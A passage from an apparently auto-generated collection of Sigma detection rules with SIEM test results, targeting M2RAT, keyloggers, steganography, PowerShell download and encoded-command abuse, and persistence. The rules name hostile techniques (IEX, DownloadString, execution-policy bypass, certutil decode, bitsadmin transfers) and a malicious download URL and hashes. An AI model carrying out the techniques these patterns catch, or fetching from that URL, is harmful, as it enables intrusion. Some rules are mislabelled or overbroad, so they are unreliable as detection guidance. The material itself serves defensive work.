        "ttp_id": "unknown",
        "technique_name": "Data Compression",
        "generation_method": "langchain",
        "id": "16cc1a9c-355a-4886-821c-850cc8e668aa",
        "siem_verification": {
          "rule_id": "16cc1a9c-355a-4886-821c-850cc8e668aa",
          "attack_id": "2602dd42-d1b1-487d-b20c-8ed1fbbda429",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 561.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "M2RAT Malware Use of Shared Memory for Command and Control",
        "description": "Detects execution of the M2RAT malware or processes that create shared memory sections, which may be used for command and control communication.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_m2rat": {
            "Image|contains": "M2RAT"
          },
          "selection_shmem": {
            "CommandLine|contains": [
              "CreateFileMapping",
              "SharedMemory"
            ]
          },
          "condition": "selection_m2rat or selection_shmem"
        },
        "falsepositives": [
          "Legitimate applications that use shared memory for inter\u2011process communication (e.g., browsers, office suites, Windows Explorer)",
          "System utilities that create file mappings (e.g., rundll32.exe, svchost.exe) for normal operation",
          "Development tools or debugging utilities that may spawn processes with shared memory flags"
        ],
        "level": "high",
        "tags": [
          "attack.command_and_control",
          "custom.m2rat",
          "custom.c2",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "generation_method": "langchain",
        "id": "b059e8f6-aff3-4994-86ef-68f5d1c741d4",
        "siem_verification": {
          "rule_id": "b059e8f6-aff3-4994-86ef-68f5d1c741d4",
          "attack_id": "c448256f-4622-4228-b56b-0ad218feb1d4",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 423.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Potential Keylogging Activity by M2RAT or Similar Tools",
        "description": "Detects creation of processes that are commonly associated with keylogging functionality, such as M2RAT backdoor components or executables/DLLs containing 'keylog' in their name. This helps identify credential access attempts via keylogging.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_m2rat": {
            "Image|endswith": "\\m2rat.exe"
          },
          "selection_keylog_name": {
            "Image|contains": "keylog"
          },
          "selection_rundll_keylog": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "keylog"
          },
          "selection_cmd_keylog": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "keylog"
          },
          "condition": "selection_m2rat or selection_keylog_name or selection_rundll_keylog or selection_cmd_keylog"
        },
        "falsepositives": [
          "Legitimate security testing tools or debugging utilities that include 'keylog' in their filename.",
          "System administration scripts that use rundll32.exe with DLLs containing 'keylog' for benign purposes.",
          "Custom internal applications named with 'keylog' for logging user actions in a controlled environment."
        ],
        "level": "high",
        "tags": [
          "attack.t1056",
          "attack.credential_access",
          "attack.t1056.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Keylogging",
        "generation_method": "langchain",
        "id": "3992f9b9-adc8-4599-b63c-36b3c013c38b",
        "siem_verification": {
          "rule_id": "3992f9b9-adc8-4599-b63c-36b3c013c38b",
          "attack_id": "5da834c2-9805-456c-86f2-3ce6adbe26cc",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 534.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Steganographic JPEG File Creation Detected via Known Hash",
        "description": "Detect creation of JPEG files whose MD5 hash matches a known steganographic payload (MD5: 93c66ee424daf4c5590e21182592672e). This indicates possible use of steganography for defense evasion.",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "TargetFilename|endswith": ".jpg",
            "Hashes|contains": "93c66ee424daf4c5590e21182592672e"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate image processing or photo editing tools creating or modifying JPEG files (e.g., Photoshop, GIMP, Windows Photo Viewer).",
          "Automated backup or synchronization software that copies JPEG files.",
          "User-initiated saving of JPEG images from browsers or email clients."
        ],
        "level": "high",
        "tags": [
          "attack.steganography",
          "custom.defense_evasion",
          "custom.t1027"
        ],
        "ttp_id": "unknown",
        "technique_name": "Steganography",
        "generation_method": "langchain",
        "id": "a936ff05-9c37-4a0f-b5ae-232f1c4da1f3",
        "siem_verification": {
          "rule_id": "a936ff05-9c37-4a0f-b5ae-232f1c4da1f3",
          "attack_id": "c28e5072-401b-4ff3-8033-5ba88aedc731",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 402.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Infostealer Binary Execution Detected",
        "description": "Detect execution of the known Infostealer/Win.Phone.C5381667 binary identified by its SHA256 hash.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Hashes|contains": "7f5a72be826ea2fe5f11a16da0178e54"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software that happens to share the same hash (extremely unlikely)",
          "Security testing or research tools that intentionally execute the sample binary"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "custom.infostealer",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Infostealer",
        "generation_method": "langchain",
        "id": "74011aae-bac4-425d-a3b1-f20a86e98952",
        "siem_verification": {
          "rule_id": "74011aae-bac4-425d-a3b1-f20a86e98952",
          "attack_id": "a4f439e2-b71a-483a-a896-893588e49eca",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 436.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Persistence via Run Registry Key Execution",
        "description": "Detects creation of processes that execute commands targeting the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry key, including usage of cmd.exe to launch PowerShell and the presence of the RyPO indicator, which are commonly used to establish persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "/c PowerShell.exe"
          },
          "selection_reg": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|contains": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          "selection_rypo": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "RyPO"
          },
          "condition": "selection_cmd or selection_reg or selection_rypo"
        },
        "falsepositives": [
          "Legitimate software installers that write to the Run key during installation",
          "System administrators manually adding entries to the Run key for convenience",
          "Scheduled tasks or startup scripts that invoke cmd.exe or reg.exe with benign parameters",
          "Security tools that query or modify the Run registry for monitoring purposes"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1053",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "generation_method": "langchain",
        "id": "f15901e3-9627-43f5-84bc-41efb34e6a65",
        "siem_verification": {
          "rule_id": "f15901e3-9627-43f5-84bc-41efb34e6a65",
          "attack_id": "b97da24d-bfce-4823-999d-e1331fbdf8d3",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 505.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Steganography Embedded in HTTP POST Requests",
        "description": "Detects processes that execute HTTP POST requests containing the keyword 'steganography', indicating possible use of steganography techniques to hide command information in the request body for defense evasion.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "POST",
              "steganography"
            ]
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": [
              "POST",
              "steganography"
            ]
          },
          "selection_python": {
            "Image|endswith": "\\python.exe",
            "CommandLine|contains": [
              "POST",
              "steganography"
            ]
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": [
              "POST",
              "steganography"
            ]
          },
          "condition": "selection_powershell or selection_curl or selection_python or selection_wget"
        },
        "falsepositives": [
          "Legitimate automation scripts or applications that perform HTTP POST requests with data payloads containing the word 'steganography' (e.g., testing tools, data\u2011processing utilities).",
          "Security or forensic tools that embed metadata in POST bodies for legitimate analysis purposes.",
          "Developers using curl, PowerShell, Python, or wget to interact with internal APIs that may include the term 'steganography' in documentation or parameter names."
        ],
        "level": "high",
        "tags": [
          "attack.t1027",
          "attack.defense_evasion",
          "custom.steganography",
          "custom.network",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Obfuscation",
        "generation_method": "langchain",
        "id": "05640071-2b35-4a21-af95-a1197dd77b4a",
        "siem_verification": {
          "rule_id": "05640071-2b35-4a21-af95-a1197dd77b4a",
          "attack_id": "a77bb3ff-c10a-43a1-832b-91f57548ee7a",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 435.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "PowerShell Execution with Potentially Malicious Arguments",
        "description": "Detects execution of PowerShell (powershell.exe) with command line arguments commonly used by attackers, such as encoded commands, web requests, or file downloads.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_iwr": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Invoke-WebRequest"
          },
          "selection_download": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "DownloadFile"
          },
          "selection_iex": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "IEX"
          },
          "condition": "selection_enc or selection_iwr or selection_download or selection_iex"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with encoded commands",
          "System management tools that invoke PowerShell for automation",
          "Scheduled tasks or Windows Update processes that run PowerShell"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "8bc85a57-eace-4e23-9577-6d676ea8f33f",
        "siem_verification": {
          "rule_id": "8bc85a57-eace-4e23-9577-6d676ea8f33f",
          "attack_id": "a4359573-1984-4e9c-99fd-ea63c1799886",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 483.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Exploitation for Client Execution via Malicious HWP or EPS Files (CVE-2017-8291)",
        "description": "Detects processes launched to execute code embedded in malicious HWP or EPS files exploiting CVE-2017-8291. The rule looks for suspicious command lines containing the indicator file names or the CVE identifier combined with typical execution binaries.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_hwp_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "Form.hwp"
          },
          "selection_hwp_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Form.hwp"
          },
          "selection_eps_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": ".eps"
          },
          "selection_eps_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": ".eps"
          },
          "selection_cve_rundll": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "CVE-2017-8291"
          },
          "condition": "selection_hwp_cmd or selection_hwp_ps or selection_eps_cmd or selection_eps_ps or selection_cve_rundll"
        },
        "falsepositives": [
          "Legitimate opening of .hwp documents with Hancom Office or other HWP viewers.",
          "Normal processing of EPS files by graphic design software (e.g., Adobe Illustrator, CorelDRAW).",
          "System administrators using rundll32.exe with the CVE identifier for testing or documentation purposes."
        ],
        "level": "critical",
        "tags": [
          "attack.t1203",
          "attack.execution",
          "custom.cve-2017-8291",
          "custom.hwp",
          "custom.eps"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "generation_method": "langchain",
        "id": "b3ad483c-bc60-4c9f-a13d-d86f5af37557",
        "siem_verification": {
          "rule_id": "b3ad483c-bc60-4c9f-a13d-d86f5af37557",
          "attack_id": "48dac5ca-75e5-44ee-9f0c-0474e28015ba",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 480.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "PowerShell Execution with Hidden, NoLogo, NonInteractive, and ExecutionPolicy Bypass",
        "description": "Detects PowerShell processes that are launched with a combination of flags commonly used by attackers to hide execution, suppress output, run non-interactively, and bypass the execution policy (e.g., -WindowStyle hidden, -NoLogo, -NonInteractive, -ep bypass). This behavior aligns with the MITRE ATT&CK technique Command and Scripting Interpreter (T1059) and indicates a high likelihood of malicious activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_hidden": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-WindowStyle hidden"
          },
          "selection_nologo": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-NoLogo"
          },
          "selection_noninteractive": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-NonInteractive"
          },
          "selection_epbypass": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-ep bypass"
          },
          "condition": "selection_hidden and selection_nologo and selection_noninteractive and selection_epbypass"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use PowerShell with hidden windows for background tasks",
          "Scheduled tasks or system maintenance jobs that invoke PowerShell with -NoLogo or -NonInteractive flags",
          "Security or monitoring tools that launch PowerShell in hidden mode for benign purposes"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "custom.powershell",
          "custom.command_and_scripting_interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "e2362985-abdc-4629-afe5-24a51647c127",
        "siem_verification": {
          "rule_id": "e2362985-abdc-4629-afe5-24a51647c127",
          "attack_id": "278262a0-4cdc-43e7-93ce-4fb73b8a21fd",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 426.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious PowerShell Execution Indicative of Persistence",
        "description": "Detects execution of PowerShell with commands commonly used for persistence such as encoded scripts, scheduled task registration, or new service creation. This helps identify malicious PowerShell activity that may establish long\u2011term footholds on Windows systems.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-EncodedCommand"
            ]
          },
          "selection_schtask": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Register-ScheduledTask",
              "New-ScheduledTaskTrigger",
              "New-ScheduledTaskAction"
            ]
          },
          "selection_newservice": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "New-Service",
              "-Name",
              "-BinaryPathName"
            ]
          },
          "condition": "selection_enc or selection_schtask or selection_newservice"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell for automation",
          "System maintenance tasks that employ encoded PowerShell commands",
          "Scheduled task creation via PowerShell by IT staff",
          "Service creation for legitimate software deployment"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "0b312009-ea21-41aa-95b6-a8e7914e7334",
        "siem_verification": {
          "rule_id": "0b312009-ea21-41aa-95b6-a8e7914e7334",
          "attack_id": "c8fb0468-66f5-4c53-aaa9-1cc4831b7022",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 509.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious PowerShell Execution with Encoded Commands",
        "description": "Detects PowerShell processes that are executed with potentially malicious flags such as encoded commands or web request invocations, which are commonly used by attackers for execution of payloads. Includes detection of PowerShell being launched from a command shell (cmd.exe) which may indicate script-based abuse.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-EncodedCommand",
              "Invoke-Expression",
              "IEX",
              "Invoke-WebRequest",
              "DownloadFile"
            ]
          },
          "selection_parent": {
            "ParentImage|endswith": "\\cmd.exe",
            "Image|endswith": "\\powershell.exe"
          },
          "condition": "selection or selection_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts run via PowerShell",
          "System maintenance tasks that use PowerShell with encoded commands for obfuscation",
          "Automation tools (e.g., SCCM, Ansible, PowerShell Desired State Configuration) that invoke PowerShell with flags like -EncodedCommand",
          "Security or monitoring solutions that spawn PowerShell for data collection"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1059.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "595a57b1-134d-4513-b363-298743bec018",
        "siem_verification": {
          "rule_id": "595a57b1-134d-4513-b363-298743bec018",
          "attack_id": "2c062f7b-0b06-4569-b547-ab4202b71fa3",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 632.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detect CMD Execution via Shared Memory",
        "description": "Detects the execution of cmd.exe where the command line indicates usage of shared memory, which may be used for remote control commands.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe"
          },
          "selection_shmem": {
            "CommandLine|contains": "shared"
          },
          "condition": "selection_cmd and selection_shmem"
        },
        "falsepositives": [
          "Legitimate administrative scripts that invoke cmd.exe with the word \"shared\" in comments or parameters",
          "System maintenance tasks or scheduled jobs that use cmd.exe and reference shared resources",
          "Debugging or development tools that launch cmd.exe with shared memory flags"
        ],
        "level": "critical",
        "tags": [
          "attack.execution",
          "attack.t1059"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "703c2d55-5de9-4893-977f-696bdc567108",
        "siem_verification": {
          "rule_id": "703c2d55-5de9-4893-977f-696bdc567108",
          "attack_id": "631fa47c-bcb9-424d-9ffe-67c007061a01",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 571.0000000000001,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Execution of Known Trojan Binary by Hash",
        "description": "Detects execution of a process whose image or command line contains the known malicious hash 7bab405fbc6af65680443ae95c30595d, indicative of Trojan/Win.Loader.C5359534 activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|contains": "7bab405fbc6af65680443ae95c30595d"
          },
          "selection_cmd": {
            "CommandLine|contains": "7bab405fbc6af65680443ae95c30595d"
          },
          "condition": "selection_image or selection_cmd"
        },
        "falsepositives": [
          "Legitimate internal tools that embed the same hash string in their file name or command line for versioning or logging purposes",
          "Custom deployment scripts that reference the hash for verification"
        ],
        "level": "critical",
        "tags": [
          "attack.t1059",
          "attack.execution",
          "custom.trojan"
        ],
        "ttp_id": "unknown",
        "technique_name": "Trojan",
        "generation_method": "langchain",
        "id": "ca323d94-ab85-45a5-924e-016f3b318f29",
        "siem_verification": {
          "rule_id": "ca323d94-ab85-45a5-924e-016f3b318f29",
          "attack_id": "d9da5b4d-f3c3-46ca-b714-5245cc736b68",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 433.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Downloader Detected via Known Malicious Hash and Download Commands",
        "description": "Detects execution of processes that either contain a known malicious downloader hash or exhibit typical download command patterns (PowerShell, wget, curl) indicative of Command and Control activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_hash": {
            "Hashes|contains": "9083c1ff01ad8fabbcd8af1b63b77e66"
          },
          "selection_ps_download": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-EncodedCommand",
              "Invoke-WebRequest",
              "IEX",
              "DownloadString"
            ]
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": "http"
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": "http"
          },
          "condition": "selection_hash or selection_ps_download or selection_wget or selection_curl"
        },
        "falsepositives": [
          "Legitimate software installers or update mechanisms that download files using PowerShell, wget or curl.",
          "System administration scripts that retrieve resources from internal repositories.",
          "Security tools that perform automated fetching of signatures or definitions."
        ],
        "level": "high",
        "tags": [
          "attack.t1105",
          "attack.command_and_control",
          "custom.downloader",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Downloader",
        "generation_method": "langchain",
        "id": "212f042c-98b5-4d67-8826-b2304fa736c9",
        "siem_verification": {
          "rule_id": "212f042c-98b5-4d67-8826-b2304fa736c9",
          "attack_id": "2392bf24-5534-4b5a-b5e4-f06345c5e326",
          "detected": true,
          "events_found": 2,
          "historical_events": 0,
          "query_time_ms": 525.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Detect Base64 Encoded Commands Execution",
        "description": "Detects execution of commands that contain Base64 encoded payloads, which is a common technique for data encoding used for defense evasion. The rule looks for PowerShell, CertUtil, and cmd.exe processes invoking Base64 encoding flags or containing Base64 strings in the command line.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-EncodedCommand",
              "-enc"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "base64"
          },
          "condition": "selection_powershell or selection_certutil or selection_cmd"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment",
          "Software installers or update mechanisms that encode data with certutil",
          "System administrators using cmd.exe to encode/decode files with base64 for legitimate purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.t1027",
          "attack.defense_evasion",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "generation_method": "langchain",
        "id": "5f166ada-3d3e-4ab2-a05d-029445163385",
        "siem_verification": {
          "rule_id": "5f166ada-3d3e-4ab2-a05d-029445163385",
          "attack_id": "228ea25a-3ca1-47b8-bf47-4d51e5f80d31",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 482.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Base64 Encoding of Command Output Detected",
        "description": "Detects processes that encode data using Base64 before exfiltration, such as certutil, PowerShell with -EncodedCommand/-enc, or cmd.exe invoking base64 utilities. This behavior aligns with the ATT&CK Data Encoding technique (T1132) used for exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode",
              "base64"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-EncodedCommand",
              "-enc"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "base64"
          },
          "condition": "selection_certutil or selection_powershell or selection_cmd"
        },
        "falsepositives": [
          "Legitimate use of certutil.exe for certificate management (e.g., encoding/decoding certificates).",
          "PowerShell scripts that intentionally use -EncodedCommand for obfuscation in internal automation.",
          "Administrators running cmd.exe with base64 utilities for legitimate data processing or testing."
        ],
        "level": "high",
        "tags": [
          "attack.t1132",
          "custom.exfiltration",
          "custom.data-encoding"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "generation_method": "langchain",
        "id": "a552c666-5488-4930-b586-6b6291ae5e06",
        "siem_verification": {
          "rule_id": "a552c666-5488-4930-b586-6b6291ae5e06",
          "attack_id": "3c8a5c98-fc6c-4f5e-a616-930f24d84b4e",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 488.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Download of JPEG Malware Tool from Suspicious URL",
        "description": "Detects processes that download a JPEG file from a known malicious URL, indicating potential malware tool download (Defense Evasion).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "elearning.or.kr/popup/handle/1.html",
              ".jpg"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "elearning.or.kr/popup/handle/1.html",
              ".jpg"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "elearning.or.kr/popup/handle/1.html",
              ".jpg"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "elearning.or.kr/popup/handle/1.html",
              ".jpg"
            ]
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": [
              "elearning.or.kr/popup/handle/1.html",
              ".jpg"
            ]
          },
          "condition": "selection_powershell or selection_cmd or selection_bitsadmin or selection_certutil or selection_curl"
        },
        "falsepositives": [
          "Legitimate use of PowerShell to download scripts or updates",
          "System administrators using cmd.exe or bitsadmin.exe for software deployment",
          "Certutil used for certificate retrieval or decoding legitimate files",
          "Curl used for authorized file downloads"
        ],
        "level": "high",
        "tags": [
          "attack.t1105",
          "custom.defense_evasion",
          "custom.download",
          "custom.malware",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Download Malware-Tools",
        "generation_method": "langchain",
        "id": "9155e402-7b41-452f-8331-4967c14d7a39",
        "siem_verification": {
          "rule_id": "9155e402-7b41-452f-8331-4967c14d7a39",
          "attack_id": "ed68c56a-8732-453a-9d04-d8226768b649",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 453.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Potential Keylogging or Screenshot Data Exfiltration",
        "description": "Detects processes that appear to capture keylogging data or screenshots and may exfiltrate them using common Windows utilities. This rule targets command-line invocations that contain indicators of keylogging or screenshot collection, as well as known exfiltration tools such as certutil and bitsadmin.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_keylog": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "keylog"
          },
          "selection_screenshot": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "screenshot"
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "http"
          },
          "condition": "selection_keylog or selection_screenshot or selection_certutil or selection_bitsadmin"
        },
        "falsepositives": [
          "Legitimate administrative scripts that generate log files named 'keylog' for debugging purposes",
          "Authorized screenshot utilities (e.g., SnippingTool.exe, Greenshot) invoked via PowerShell",
          "System maintenance tools using certutil for certificate management",
          "Bitsadmin used by IT for legitimate file transfers"
        ],
        "level": "high",
        "tags": [
          "attack.t1041",
          "attack.t1567",
          "custom.exfiltration",
          "custom.windows",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Exfiltration",
        "generation_method": "langchain",
        "id": "e1e2d89a-816f-4bf6-9713-3ef04bc6913c",
        "siem_verification": {
          "rule_id": "e1e2d89a-816f-4bf6-9713-3ef04bc6913c",
          "attack_id": "55a1df9b-ba14-459b-83f8-dfe877a9a948",
          "detected": true,
          "events_found": 6,
          "historical_events": 0,
          "query_time_ms": 431.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "M2RAT Remote Command Execution via cmd.exe",
        "description": "Detects execution of cmd.exe processes that are launched by the M2RAT remote access tool or contain references to M2RAT in their command line, indicating potential remote command execution by the threat actor.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_m2rat": {
            "ParentImage|endswith": "\\M2RAT.exe",
            "Image|endswith": "\\cmd.exe"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "M2RAT"
          },
          "condition": "selection_m2rat or selection_cmd"
        },
        "falsepositives": [
          "Legitimate administrative scripts or batch files executed via cmd.exe",
          "Scheduled tasks or system maintenance utilities that invoke cmd.exe",
          "Software installers or update mechanisms that spawn cmd.exe for configuration"
        ],
        "level": "critical",
        "tags": [
          "attack.t1219",
          "attack.command_and_control",
          "custom.m2rat"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tools",
        "generation_method": "langchain",
        "id": "79bbd622-9549-446b-8610-72134a8cf991",
        "siem_verification": {
          "rule_id": "79bbd622-9549-446b-8610-72134a8cf991",
          "attack_id": "d820280e-f5ee-42ef-ac29-1b12db501a6f",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 503.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
